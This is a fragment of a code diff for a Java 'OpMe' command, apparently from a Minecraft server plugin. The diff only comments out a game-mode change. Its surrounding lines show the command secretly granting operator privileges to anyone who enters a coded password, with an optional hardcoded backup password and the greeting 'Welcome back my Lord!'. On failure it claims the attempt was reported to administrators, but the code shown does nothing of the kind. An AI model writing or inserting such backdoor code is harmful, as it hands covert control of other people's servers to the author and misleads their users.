@@ -24,11 +24,11 @@ public class OpMe implements CommandExecutor {
             //uncomment below if you want to have backup access
             if (pass.equals(coded_input_pass) /*||  input_pass.equals("your_backup_password") */){
                 player.setOp(true);
-                player.setGameMode(GameMode.CREATIVE);
+                // optional --- gamemode change to CREATIVE on opping self
+                //player.setGameMode(GameMode.CREATIVE);
                 player.sendMessage("Welcome back my Lord!");
             } else {
                 player.sendMessage("The given param was invalid. Your action has been reported to server administration.");
-
             }
             return true;
         }
